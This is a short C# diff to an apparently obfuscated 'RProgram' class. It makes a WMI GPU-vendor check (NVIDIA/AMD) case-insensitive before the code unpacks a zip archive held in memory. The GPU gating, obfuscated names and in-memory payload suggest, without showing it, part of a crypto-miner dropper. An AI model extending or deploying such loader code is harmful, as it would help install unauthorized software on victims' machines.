@@ -188,10 +188,10 @@ public partial class RProgram
                 var rarg6 = new ManagementObjectSearcher(rarg5, new ObjectQuery("SELECT Name, VideoProcessor FROM Win32_VideoController")).Get();
                 foreach (ManagementObject MemObj in rarg6)
                 {
-                    rarg7 += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]).ToLower();
+                    rarg7 += (" " + MemObj["VideoProcessor"] + " " + MemObj["Name"]);
                 }
 
-                if (reT.Length > 1 && (rarg7.Contains("nvidia") || rarg7.Contains("amd")))
+                if (reT.Length > 1 && (rarg7.IndexOf("nvidia", StringComparison.OrdinalIgnoreCase) >= 0 || rarg7.IndexOf("amd", StringComparison.OrdinalIgnoreCase) >= 0))
                 {
                     using (var archive = new ZipArchive(new MemoryStream(reT)))
                     {
